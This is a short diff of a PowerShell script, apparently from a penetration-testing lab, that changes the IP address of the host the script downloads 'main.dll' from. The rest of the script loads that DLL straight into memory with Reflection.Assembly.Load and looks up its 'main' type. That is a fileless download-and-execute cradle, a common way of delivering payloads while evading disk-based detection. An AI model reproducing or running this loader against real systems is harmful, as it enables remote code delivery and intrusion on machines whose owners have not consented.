@@ -1,4 +1,4 @@
-$data = $wc.DownloadData('http://192.168.49.112/main.dll');
+$data = $wc.DownloadData('http://192.168.49.116/main.dll');
 $assembly = [System.Reflection.Assembly]::Load($data);
 
 $class = $assembly.GetType('main')
